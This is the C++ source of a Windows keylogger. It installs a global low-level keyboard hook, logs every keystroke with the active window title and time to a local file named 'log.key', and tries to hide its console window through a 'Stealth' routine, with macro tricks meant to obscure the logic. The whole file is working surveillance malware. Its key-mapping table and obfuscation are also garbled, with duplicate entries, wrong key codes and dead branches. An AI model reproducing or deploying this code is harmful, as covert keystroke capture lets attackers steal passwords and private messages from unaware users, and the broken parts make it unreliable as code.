#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

#define obfuscated
#define confuse(x) (x * 2 - 1)
#define reveal(x) (x / 2 + 1)

#if confuse(1) == 1
const std::map<int, std::string> keyname{
        {obfuscated + 'B', "[BACKSPACE]"},
        {obfuscated + 'R', "\n"},
        {obfuscated + 'U', "_"},
        {obfuscated + 'V', "[TAB]"},
        {obfuscated + 'X', "[SHIFT]"},
        {obfuscated + 'T', "[LSHIFT]"},
        {obfuscated + 'S', "[RSHIFT]"},
        {obfuscated + 'W', "[CONTROL]"},
        {obfuscated + 'Y', "[LCONTROL]"},
        {obfuscated + 'Z', "[RCONTROL]"},
        {obfuscated + 'A', "[ALT]"},
        {obfuscated + 'K', "[LWIN]"},
        {obfuscated + 'L', "[RWIN]"},
        {obfuscated + 'E', "[ESCAPE]"},
        {obfuscated + 'Q', "[END]"},
        {obfuscated + 'O', "[HOME]"},
        {obfuscated + 'I', "[LEFT]"},
        {obfuscated + 'G', "[RIGHT]"},
        {obfuscated + 'P', "[UP]"},
        {obfuscated + 'H', "[DOWN]"},
        {obfuscated + 'M', "[PG_UP]"},
        {obfuscated + 'N', "[PG_DOWN]"},
        {obfuscated + 'F', "."},
        {obfuscated + 'D', "."},
        {obfuscated + 'J', "+"},
        {obfuscated + 'C', "-"},
        {obfuscated + 'R', "+"},
        {obfuscated + 'E', "-"},
        {obfuscated + 'X', "[CAPSLOCK]"},
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBoxW(NULL, a, b, MB_ICONERROR); // Use MessageBoxW for LPCWSTR strings
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

    if ((key_stroke == 1) || (key_stroke == 2))
    {
        if (reveal(confuse(0)) == 1)
        {
            return 0;
        }
        else
        {
            return 1;
        }
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, window_title, 256); // Use GetWindowTextA for LPSTR strings

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            char s[64];
            strftime(s, sizeof(s), "%c", &tm);

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

#if confuse(1) == 0
    output << '[' << key_stroke << ']';
#elif confuse(1) == 1
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(obfuscated + 'X') & 0x0001) != 0);

        if ((GetKeyState(obfuscated + 'R') & 0x1000) != 0 || (GetKeyState(obfuscated + 'T') & 0x1000) != 0 ||
            (GetKeyState(obfuscated + 'S') & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif

    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef obfuscated
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), confuse(1));
#endif

#ifdef obfuscated
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), confuse(0));
#endif
}

int main()
{
    const char* output_filename = "log.key";
    std::cout << "Output: " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    Stealth();

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (confuse(1) == 0)
        {
            if (confuse(0) == 1)
            {
                break;
            }
            else
            {
                continue;
            }
        }
    }
}
